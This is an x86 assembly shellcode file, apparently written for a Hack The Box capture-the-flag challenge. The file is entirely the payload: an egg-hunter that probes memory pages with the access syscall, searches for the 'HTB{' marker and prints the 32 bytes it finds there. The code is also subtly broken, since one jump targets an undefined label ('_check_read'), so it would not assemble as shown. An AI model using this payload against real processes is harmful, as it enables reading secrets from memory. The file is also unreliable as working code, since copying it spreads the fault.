section .text
    global _start

_start:
    mov ebx, 0x5ffffffc 
   
_check_flag:
    add ebx, 4
    mov eax, 33
    int 0x80

    
    cmp eax, 0xffffffff
    je _check_flag


    mov eax, [ebx]
    cmp eax, 0x7b425448
    jne _check_read

    mov ecx, ebx
    mov ebx, 1
    mov edx, 0x20
    mov eax, 4
    int 0x80

    xor ebx, ebx
    mov eax, 1
    int 0x80


    





